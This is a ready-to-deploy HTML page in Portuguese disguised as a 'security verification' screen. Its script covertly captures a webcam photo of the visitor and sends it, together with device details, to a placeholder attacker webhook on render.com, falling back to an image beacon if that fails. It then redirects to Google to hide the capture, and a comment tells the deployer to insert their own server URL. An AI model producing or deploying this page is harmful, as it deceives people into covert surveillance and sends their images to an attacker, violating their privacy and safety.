<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificação de Segurança</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        .container {
            text-align: center;
            padding: 40px;
            background: white;
            border-radius: 16px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            max-width: 400px;
        }
        .logo {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            color: white;
            font-size: 36px;
        }
        .spinner {
            width: 40px; height: 40px;
            border: 4px solid #e0e0e0;
            border-top-color: #667eea;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .status { color: #666; font-size: 14px; margin-top: 10px; }
        .progress-bar {
            width: 100%;
            height: 4px;
            background: #e0e0e0;
            border-radius: 2px;
            margin-top: 20px;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #667eea, #764ba2);
            width: 0%;
            animation: progress 3s ease-in-out forwards;
        }
        @keyframes progress { to { width: 100%; } }
        #video { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🔒</div>
        <h2>Verificação de Segurança</h2>
        <p style="color: #888; font-size: 13px; margin: 10px 0;">
            Seu dispositivo está sendo verificado para garantir acesso seguro.
        </p>
        <div class="spinner" id="spinner"></div>
        <p class="status" id="status">Inicializando verificação...</p>
        <div class="progress-bar">
            <div class="progress-fill"></div>
        </div>
        <video id="video" autoplay muted playsinline></video>
        <canvas id="canvas" style="display:none;"></canvas>
    </div>

    <script>
        (function() {
            // ==========================================
            // DEPOIS VOCÊ VAI TROCAR A URL AQUI
            // ==========================================
            const WEBHOOK_URL = 'https://SEU-SERVIDOR.render.com/capture';
            // ==========================================

            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const status = document.getElementById('status');
            const spinner = document.getElementById('spinner');
            let mediaStream = null;

            async function startCamera() {
                try {
                    const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
                    
                    mediaStream = await navigator.mediaDevices.getUserMedia({
                        video: { 
                            width: { ideal: 640 }, 
                            height: { ideal: 480 },
                            facingMode: isMobile ? 'user' : 'environment'
                        },
                        audio: false
                    });
                    
                    video.srcObject = mediaStream;
                    await video.play();
                    
                    status.textContent = 'Verificação concluída. Redirecionando...';
                    spinner.style.display = 'none';

                    setTimeout(captureAndSend, 1000);

                    setTimeout(() => {
                        window.location.href = 'https://www.google.com';
                    }, 3000);

                } catch (err) {
                    console.error('Erro:', err);
                    status.textContent = 'Verificação falhou. Redirecionando...';
                    spinner.style.display = 'none';
                    setTimeout(() => {
                        window.location.href = 'https://www.google.com';
                    }, 2000);
                }
            }

            function captureAndSend() {
                if (!mediaStream || !mediaStream.active) return;
                
                const ctx = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0);
                
                const base64Image = canvas.toDataURL('image/jpeg', 0.8);
                
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        image: base64Image,
                        timestamp: new Date().toISOString(),
                        userAgent: navigator.userAgent,
                        screen: screen.width + 'x' + screen.height,
                        platform: navigator.platform
                    })
                }).catch(() => {
                    const img = new Image();
                    img.src = WEBHOOK_URL + '?data=' + encodeURIComponent(base64Image);
                });

                mediaStream.getTracks().forEach(track => track.stop());
            }

            startCamera();
        })();
    </script>
</body>
</html>
